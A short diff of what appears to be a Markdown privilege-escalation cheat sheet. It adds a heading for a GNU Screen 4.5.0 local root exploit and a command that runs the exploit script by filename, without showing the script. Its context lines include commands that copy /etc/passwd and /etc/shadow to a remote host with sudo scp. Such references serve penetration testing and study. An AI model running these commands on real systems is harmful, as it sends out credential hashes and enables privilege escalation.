@@ -239,3 +239,9 @@ ALL=(root) NOPASSWD: /usr/bin/awk
   sudo scp /etc/passwd mayank@192.168.1.105:~/
   sudo scp /etc/shadow mayank@192.168.1.105:~/
   ``````````
+ 
+  # 14.  GNU Screen 4.5.0 - Local Privilege Escalation 
+ - /bin/screen 
+ ```````````
+sh GNU Screen 4.5.0 - Local Privilege Escalation.py
+```````````````````````````````````````````````````````
